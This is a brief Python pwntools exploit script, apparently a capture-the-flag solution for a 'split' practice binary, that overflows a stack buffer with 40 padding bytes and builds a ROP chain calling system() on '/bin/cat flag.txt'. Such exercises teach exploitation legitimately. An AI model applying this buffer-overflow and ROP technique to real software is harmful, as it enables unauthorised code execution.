from pwn import *

elf = context.binary = ELF("./split")

rop = ROP(elf)
rop.system(next(elf.search("/bin/cat flag.txt")))

r = process(elf.path)

payload = ""
payload += "A" * 40
payload += str(rop)
r.sendlineafter("> ", payload)

r.interactive()
